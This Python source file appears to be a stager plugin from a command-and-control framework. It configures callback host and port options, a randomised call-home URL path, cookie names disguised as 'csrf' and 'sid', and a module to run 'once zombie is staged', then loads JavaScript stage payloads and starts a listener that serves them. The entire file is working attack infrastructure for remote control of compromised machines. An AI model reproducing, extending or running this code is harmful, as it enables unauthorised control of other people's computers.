import core.plugin
import core.server
import random
import string
import socket

class Stager(core.plugin.Plugin):
    WORKLOAD = "NONE"

    def __init__(self, shell):
        self.port = 9999
        super(Stager, self).__init__(shell)

        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        hostname = '0.0.0.0'
        try:
            s.connect(('8.8.8.8', 80))
            hostname = s.getsockname()[0]
        finally:
            s.close()

        # general, non-hidden, non-advanced options
        self.options.register('SRVHOST', hostname, 'Where the stager should call home', alias = "LHOST")
        self.options.register('SRVPORT', self.port, 'The port to listen for stagers on', alias = "LPORT")
        self.options.register('EXPIRES', '', 'MM/DD/YYYY to stop calling home', required = False)
        #self.options.register('DIRECTORY', '%TEMP%', 'A writeable directory on the target', advanced = True)
        self.options.register('KEYPATH', '',  'Private key for TLS communications', required = False)
        self.options.register('CERTPATH', '', 'Certificate for TLS communications', required = False)
        self.options.register('ENDPOINT', self.random_string(5), 'URL path for callhome operations', required = False, advanced = True)
        self.options.register('MODULE', '', 'Module to run once zombie is staged', required = False)

        # names of query string properties
        self.options.register("JOBNAME", "csrf", "name for jobkey cookie", advanced = True)
        self.options.register("SESSIONNAME", "sid", "name for session cookie", advanced = True)

        # query strings
        self.options.register("_JOBPATH_", "", "the job path", hidden = True)
        self.options.register("_SESSIONPATH_", "", "the session path", hidden = True)

        # script payload file paths
        self.options.register("_STDLIB_", "", "path to stdlib file", hidden = True)
        self.options.register("_TEMPLATE_", "", "path to template file", hidden = True)
        self.options.register("_STAGE_", "", "stage worker", hidden = True)
        self.options.register("_STAGECMD_", "", "path to stage file", hidden = True)
        self.options.register("_FORKCMD_", "", "path to fork file", hidden = True)
        self.options.register("CLASSICMODE", "", ";)", hidden = True)

        # is this one needed, hmm, I dunno
        #fname = self.random_string(5)
        #self.options.register('FILE', fname, 'unique file name', advanced=True)

        # standard scripts
        self.stdlib = self.loader.load_script("data/stager/js/stdlib.js")
        self.stage = self.loader.load_script("data/stager/js/stage.js")

    def run(self):
        self.options.set('SRVHOST', self.options.get('SRVHOST').strip())
        self.options.set('SRVPORT', int(str(self.options.get('SRVPORT')).strip()))
        self.options.set('ENDPOINT', self.options.get('ENDPOINT').strip())
        self.options.set("_STDLIB_", self.stdlib)
        self.options.set("_TEMPLATE_", self.template)
        self.options.set("_STAGECMD_", self.stagecmd)
        self.options.set("_FORKCMD_", self.forkcmd.decode().replace("\\","\\\\").replace("\"", "\\\"").encode())

        self.options.set("_STAGE_", self.stage)

        if self.options.get("CLASSICMODE"):
            self.options.set("ENDPOINT", self.random_string(4000))

        self.start_server(core.handler.Handler)



    def start_server(self, handler):
        try:
            server = core.server.Server(self, handler)
            self.shell.stagers.append(server)
            server.start()

            self.shell.play_sound('STAGER')
            self.shell.print_good("Spawned a stager at %s" % (server.options.get("URL")))
            self.shell.print_warning("Don't edit this URL! (See: 'help portfwd')")
            server.print_payload()
        except OSError as e:
            port = str(self.options.get("SRVPORT"))
            if e.errno == 98:
                self.shell.print_error("Port %s is already bound!" % (port))
            elif e.errno == 13:
                self.shell.print_error("Port %s bind permission denied!" % (port))
            else:
                raise
            return
        except Exception as ex:
            import traceback
            template = "An exception of type {0} occured. Arguments:\n{1!r}"
            message = template.format(type(ex).__name__, ex.args)
            self.shell.print_error(message)
            traceback.print_exc()
        except:
            self.shell.print_error("Failed to spawn stager")
            raise
